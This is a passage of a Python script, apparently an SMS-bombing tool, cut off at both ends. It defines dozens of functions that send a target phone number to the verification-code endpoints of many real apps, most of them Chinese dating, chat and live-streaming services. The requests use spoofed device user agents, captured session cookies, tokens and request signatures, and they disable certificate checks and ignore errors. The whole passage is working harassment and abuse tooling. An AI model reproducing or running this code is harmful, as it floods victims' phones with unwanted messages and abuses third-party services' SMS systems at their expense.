    headers = {'User-Agent': 'Dart/3.10 (dart:io)', 'Accept': 'application/json', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_kayouxkd(phone):
    url = 'https://app.kayouxkd.com/kayou-app/api/v1//sms/aliSend'
    payload = {'mobile': phone, 'client': '1', 'event': 'login', 'cid': '2eef15a5bedd53323bfd7b66bd35239cb'}
    headers = {
        'User-Agent': 'okhttp/3.14.9',
        'Accept-Encoding': 'gzip',
        'token': '',
        'type': 'Android',
        'version': '1.0.3',
        'versionnum': '103'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_douya(phone):
    url = 'https://developer.douya.wang/v2.0.0/api/common/smscode/code'
    payload = {'phone': phone, 'role': 'app'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Secret-Token': '4a9924aa8bb842c0cb8f60e6d7068572|1781166568',
        'Sign-Token': 'c506f370491e377e81cef4666da524c3',
        'Auth-Token': 'false',
        'App-Id': '1044720160455280',
        'Cookie': 'acw_tc=76b20f7917811665514287004ee9644f2f2e44b5f9df6bbd7e554632d5c10f'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_liwusong(phone):
    url = 'https://radar-api.liwusong.cn/api/auth/sms/send-code'
    payload = {'phone': phone, 'scene': 'LOGIN'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'ngrok-skip-browser-warning': '1',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/json;charset=UTF-8',
        'Cookie': 'JSESSIONID=1F984AF5A8D54B67D9508B71EB90E5EA'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xieqidong(phone):
    url = 'https://xieqidong.com.cn/api/send_sms_code'
    payload = {'phone': phone, 'scene': 'register', 'client_fingerprint': 'idfv:c45b59b7-0df7-46ca-a716-773e654fa07d|model:PJE110|Android:16'}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_hsfpv(phone):
    url = 'https://hs-fpv.com/api/v1/auth/sms/send'
    payload = {'phone': phone, 'scene': 'login'}
    headers = {
        'User-Agent': 'Dart/3.12 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-app-flavor': 'prod',
        'x-app-version': '0.2.31'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xiangqinhui(phone):
    url = 'https://api.xiangqinhui.love/api/v1/app/auth/otp/request'
    payload = {'phoneNumber': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_gean5(phone):
    url = 'https://dhhapi.gean5.top/api/app/user/sendSmsCode'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': ''
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_dreamhangar(phone):
    url = 'https://api-server.dreamhangar.cn/api/app/user/sendSmsCode'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': ''
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_younggenelove(phone):
    url = 'https://app.younggenelove.cn/yangjing-app/api/v1/sms/aliSend'
    payload = {'user_id': '', 'mobile': phone, 'event': 'register'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 16; zh-cn; PJE110 Build/TP1A.220905.001) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1',
        'Accept': 'application/json,application/xml,application/xhtml+xml,text/html;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'accept-language': 'zh-CN,zh',
        'Cookie': 'JSESSIONID=E30D56F311591C20722C95FF75A71037'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_qquanyun(phone):
    url = 'http://jnc.qquanyun.top/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin', 'device_id': '114695049B2DBC067822C251105876B5'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'appid': 'xiaoyunkeji001',
        'sign': 'ba492f885770f0920a246237fb8bfd3e89bf57f5e731d21c80e02d10fe207eb5',
        'timestamp': '1781167756',
        'token': ''
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_aiyimaiquan(phone):
    url = 'https://www.aiyimaiquan.com/api/mobile/users/send-sms'
    payload = {'phone': phone, 'type': 'login'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xxsy(phone):
    url = 'https://api.xxsy.site/commonUtils/captcha/getSmsCaptcha'
    params = {'phoneNumber': phone}
    headers = {'User-Agent': 'Dart/3.11 (dart:io)', 'Accept-Encoding': 'gzip'}
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_heartmeetai(phone):
    url = 'https://api.heartmeetai.com/auth/send-sms-code'
    payload = {'phone': phone, 'country_code': '+86', 'purpose': 'register'}
    headers = {
        'User-Agent': 'Dart/3.11 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-app-version': '1.3.2'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_hnyynet(phone):
    url = 'https://tools.hnyynet.com.cn/tool-app/app/business/captcha'
    params = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36',
        'Accept-Encoding': 'gzip',
        'Cookie': 'PRODUCTID=1228;PKG=com.csylhl.zrjhwhk;CHANNEL=oppo;VER=1.0.0;OAID=F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157;APPCODE=jh_zrjhw;BRAND=OnePlus;MODEL=PJE110;HARDWAREINFO=873163d51fed40b8bfc39dbe84557c3e;OSVERSION=16;SESSIONID=2'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_jiexiaoke(phone):
    url = 'https://m.jiexiaoke.com/api/sendSms'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'token': ''
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_chat2080(phone):
    url = 'https://www.chat2080.com/v1/user/send_sms_code'
    payload = {'phone': phone}
    headers = {'User-Agent': 'Dart/3.11 (dart:io)', 'Accept-Encoding': 'gzip', 'Content-Type': 'application/json'}
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_genesisnode1(phone):
    url = 'https://hmdj.genesisnode1.cn/prod-api/sms/sendCode'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json;charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_dianjixinli(phone):
    url = 'https://www.dianjixinli.cn/index.php'
    params = {'s': '/api/sms/send'}
    payload = {'event': 'mobilelogin', 'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'platform': 'APP',
        'token': 'false',
        'Content-Type': 'application/json;charset=utf-8'
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_szxjhui(phone):
    url = 'https://consumer.szxjhui.com/agg/verification/send-sms'
    params = {'type': 'USER_LOGIN'}
    payload = {'phoneRegion': '+86', 'phoneNumber': phone}
    headers = {
        'User-Agent': 'Dart/3.11 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'x-client': 'C_APP',
        'x-token': '',
        'x-language': 'zh-CN',
        'x-user': '',
        'x-scope': 'CUSTOMER'
    }
    try:
        requests.post(url, params=params, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_mokatech(phone):
    url = 'https://vchat.mokatech.cn/account/captcha/sendv2'
    params = {'fu': 'bc4265d8-0656-4288-9fd6-be1ee2cc19ad'}
    payload = {
        'rtype': '5',
        'country': '+86',
        'phone': phone,
        'type': '1',
        'geet_token': '',
        '_net_': 'wifi',
        '_imei_': '',
        '_uid_': '36814e2e22d7f9a0',
        '_oaid_': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157',
        '_mmuid_': 'eb0e046b0af2f600881115b687156d4f132cc512',
        'browse_UA': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36',
        'browser_UA': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36',
        'room_mute': '0',
        'channel_key': 'oppo',
        'lat': '',
        'lng': ''
    }
    headers = {
        'User-Agent': 'Vchat/4.9.2.1 Android/2121 (PJE110; Android 16; Gapps 0; zh_CN; oppo; OnePlus)',
        'Accept-Encoding': 'gzip',
        'accept-language': 'zh_CN',
        'x-kv': 'f14dd39f',
        'x-lv': '1',
        'cache-control': 'no-cache'
    }
    try:
        requests.post(url, params=params, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_immomo(phone):
    url = 'https://api-mini.immomo.com/api/safe/verifycode/send'
    params = {'fu': 'ef955e3208fb10760d2ebdeadacd5c81'}
    payload = {'countryCode': '+86', 'phonenumber': phone, '_iid': '88ed7aaa0805cc2eaaf6117feb4158e9', 'voiceSms': '0', '_net_': 'wifi', '_uid_': 'ef955e3208fb10760d2ebdeadacd5c81'}
    headers = {
        'User-Agent': 'MomoChat/9.2.6_64 Android/8425 (PJE110; Android 16; Gapps 0; zh_CN; 12; OnePlus)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'X-Span-Id': '0',
        'Charset': 'UTF-8',
        'Multiua': 'MomoChat/9.2.6.20_fast_64 Android/100365 (PJE110; Android 16; zh_CN; 12; OnePlus; fast)',
        'Accept-Language': 'zh-CN',
        'X-Trace-Id': 'EBBF1030-0D19-4067-931A-60F3A6D6A259',
        'Cookie': 'SESSIONID=31994617-F51E-032A-D6A9-6477C325BE76_G'
    }
    try:
        requests.post(url, params=params, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_zaihun(phone):
    url = 'https://www.zaihun.com.cn/m/reg_diy.php'
    params = {'submitok': 'ajax_get_verify'}
    payload = {'mob': phone, 'js': '0'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Html5Plus/1.0',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://www.zaihun.com.cn',
        'x-requested-with': 'cn.zaihun.app',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.zaihun.com.cn/m/reg_diy.php?subscribe=&tguid=&ifback=1',
        'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
        'Cookie': 'cook_index_bounce11=indexgg; PHPSESSID=23fcppl6jj31t2born6csuen35'
    }
    try:
        requests.post(url, params=params, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_meetuvip(phone):
    url = 'https://api.meetuvip.com/user/login/sms_code'
    payload = {'mobile': phone, 'nation_code': '86', 'verifiy_type': '1'}
    headers = {
        'User-Agent': 'okhttp/3.11.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'channel': 'oppo',
        'terminal': 'OnePlus PJE110',
        'version': '2.11.15',
        'deviceId': '32A9E03DF9B10EC48383FEE5464F6139606DC0BF',
        'pkg': 'com.deepvision.meetu',
        'Authorization': '',
        'osVersion': '16',
        'clientPlatform': '21',
        'appId': '1',
        'client': '21',
        'imei': '32A9E03DF9B10EC48383FEE5464F6139606DC0BF',
        'oaId': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157',
        'cid': '',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xiangbanwl(phone):
    url = 'https://api.xiangbanwl.com/login/sendsms'
    payload = {'id': phone}
    headers = {
        'User-Agent': 'okhttp/4.9.3',
        'Accept-Encoding': 'gzip',
        'content-type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_timeshuttle(phone):
    url = 'https://pro-zhitian-api.timeshuttle.cn/portal/sendSms'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Brand': 'OnePlus PJE110 android 16',
        'Timestamp': '1781173185',
        'Chnl': 'oppo',
        'Sign': '527cccd57dc5ae211ed297a0a61009e8',
        'Version': '2.3.0'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_yilianxq(phone):
    url = 'https://api.yilianxq.com/api/sms/sendlogincode'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'channel': 'oppo',
        'version-code': '1402',
        'client-id': 'bd8b5f6f-8b0f-4c91-8a03-193598b497f21781173387591',
        'version': '1.3.9'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_jstantan(phone):
    url = 'https://www.jstantan.com/home/sms/send'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'okhttp/3.12.10',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'app-platform': 'OPPO',
        'app-type': 'android',
        'device_uuid': '',
        'app-version': '8.7'
    }
    try:
        requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_xiban(phone):
    url = 'https://api.xiban.net/api/login/sendLoginSms'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'versionapp': '2.6.7',
        'uid': '',
        'mobilemodel': 'HydrogenOS',
        'android': '38dd7dba77605306',
        'env': 'app',
        'usevip': 'other',
        'token': '',
        'Cookie': ''
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ruiwiw(phone):
    url = 'https://api.ruiwiw.cn/v1/api/auth/mobile_code'
    params = {'mobile': phone, 'type': '1'}
    headers = {
        'User-Agent': 'okhttp/3.12.8',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'appootb-net': '2',
        'appootb-udid': '41355f0c-9e12-486c-8fcc-b052c005c891',
        'appootb-time': '1781173760',
        'appootb-token': '',
        'appootb-dev': 'false',
        'appootb-sn': '0594a8a4e117bd35e43b1c528df2f8f8',
        'appootb-channel': 'oppo',
        'appootb-plf': '256',
        'appootb-model': 'PJE110',
        'appootb-pkg': 'com.friend.matchmaking',
        'appootb-brand': 'kalama',
        'appootb-os': '36',
        'appootb-ver': '2.7.3',
        'appootb-prd': 'snelc',
        'appootb-test': 'false',
        'Content-Type': 'application/json'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_09784(phone):
    url = 'https://server.09784.com/api/auth/getcode'
    params = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
    }
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_wzaapp(phone):
    url = 'https://api.wzaapp.com/api/pub/sendSms'
    params = {'phoneNumber': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, params=params, json={}, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_whhyn(phone):
    url = 'https://papi.whhyn.shop/auth/sms/send'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'okhttp/4.11.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'saToken': '',
        'deviceId': '2a88bbcddcd6776e',
        'deviceMac': '2a88bbcddcd6776e',
        'clientVersion': '1.0.1.4',
        'versionCode': '30000015',
        'Content-Type': 'application/json; charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_sixbits(phone):
    url = 'https://www.sixbits.cn/zcxq/sms/send'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'Dart/3.7 (dart:io)',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'dm': 'PJE110',
        'dmf': 'OnePlus',
        'a': 'zcxq702dsb1wnt23ge',
        'sign': 'db992c332722cda3ae473bc2b20c1aa5',
        'v': '3.0.01',
        's': '1781174054975',
        'p': 'android',
        'dv': '16'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_laland(phone):
    url = 'https://api.laland.fun/api/login/send_sms'
    payload = {'phone_country_code': '+86', 'phone_number': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'X-OS': 'android',
        'X-Base-Version-Code': '402',
        'X-Uni-Platform': 'app',
        'X-App-Channel': 'oppo',
        'X-Device-Brand': 'oneplus',
        'X-User-Id': '',
        'X-Token': '',
        'X-Version-Code': '455',
        'X-Version': '1.4.0',
        'X-Base-Version': '1.3.0'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_tuodanmatou(phone):
    url = 'https://www.tuodanmatou.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobilelogin'}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'version': '154',
        'token': '',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_huihuang(phone):
    url = 'http://www.huihuang.world/app_api/send_code'
    payload = {'mobile': phone}
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_sxqqh(phone):
    url = 'https://api.sxqqh.cn/api/user/SendPhoneMsg'
    payload = {'PhoneNo': phone, 'AreaId': '08daf9e350584df78aee7239985b7658', 'SourceType': '注册'}
    headers = {
        'User-Agent': 'okhttp/4.9.0',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json; charset=utf-8'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_jlikeji(phone):
    url = 'https://matchmaking.jlikeji.cn/api/sms/sendCode'
    payload = {'mobile': phone, 'scene': 'BDSJHM', 'channel': 6}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'sign': '249CA0D6C2D8D86C85038BC9006C9DB4',
        'nonce': 'rv1zS5QDX1jht8293ChKI7Y6bckTV9Jb',
        'platform': 'ANDROID',
        'timestamp': '1781175286'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_littlelove(phone):
    url = 'https://www.littlelove.com.cn/minilike/account/login/getCode'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 (Immersed/40.0) Html5Plus/1.0',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_sumlive(phone):
    url = 'https://liveopapp.sumlive.cn/live/operation/control/helper/auth/user/sendCaptcha'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'deviceId': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_lmizhibo(phone):
    url = 'https://lmilive.lmizhibo.com/app/user/smsCode'
    payload = {'phone': phone}
    headers = {
        'User-Agent': 'Dart/3.10 (dart:io)',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'lmi-device-id': 'app-d89139a347088e15ea12f2744864bb47'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_qusimi(phone):
    url = 'https://api.qusimi.cn/api/getCode'
    data = {'user_login': phone}
    headers = {
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 16; PJE110 Build/TP1A.220905.001)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'TE': 'gzip, deflate; q=0.5'
    }
    try:
        requests.post(url, data=data, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_kuaiying(phone):
    url = 'http://api.kuaiyingapp.com/api.php/'
    params = {'s': 'Common.sendSmsCode'}
    payload = {
        'access_token': 'e2d742c8a33e77527a06999a41af1e6a56d31c5f',
        'app_type': 'android',
        'os': 'android_16',
        'device_brand': 'OnePlus.PJE110',
        'phone': phone,
        'v': 'android_101',
        'channel': 'common',
        'network_status': 'wifi',
        'app_type_name': '安卓',
        'scene': 'login',
        'phone_code': '86'
    }
    headers = {'User-Agent': 'okhttp/3.12.1', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    try:
        requests.post(url, params=params, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_cylive(phone):
    url = 'http://api.cylive.top/api.php/'
    params = {'s': 'Common.sendSmsCode'}
    payload = {
        'access_token': 'ae2e20f754587d528aba096048c41c826858cdcd',
        'meid': '83bae423de964ab6b92bb483662d5462',
        'app_type': 'android',
        'os': 'android_16',
        'device_brand': 'OnePlus.PJE110',
        'phone': phone,
        'v': 'android_105',
        'channel': 'common',
        'network_status': 'wifi',
        'app_type_name': '安卓',
        'scene': 'login',
        'phone_code': '86'
    }
    headers = {'User-Agent': 'okhttp/3.12.1', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    try:
        requests.post(url, params=params, data=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_wuhanjijin(phone):
    url = 'http://api.wuhanjijin.com/app/auth/sendMessage'
    params = {'phone': phone}
    headers = {'User-Agent': 'Dart/3.6 (dart:io)', 'Accept-Encoding': 'gzip', 'clientid': ''}
    try:
        requests.get(url, params=params, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_uxiutv(phone):
    url = 'https://admin.uxiutv.com/api/sms/send'
    payload = {'mobile': phone, 'event': 'mobile_login'}
    headers = {
        'User-Agent': 'okhttp/4.9.3',
        'Accept-Encoding': 'gzip',
        'androidid': '',
        'deviceid': 'OnePlus-PJE110-qcom_0e35fd9b7715a4a6',
        'system': 'Android',
        'appversion': '1.7.9.1',
        'model': 'OnePlus-PJE110',
        'channel': 'oppo',
        'imei': '',
        'random': '1.7812390376406248E12',
        'android_currenttimemillis': '1781239037640',
        'oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157',
        'Content-Type': 'application/json'
    }
    try:
        requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
    except:
        pass

def send_ishuaji(phone):
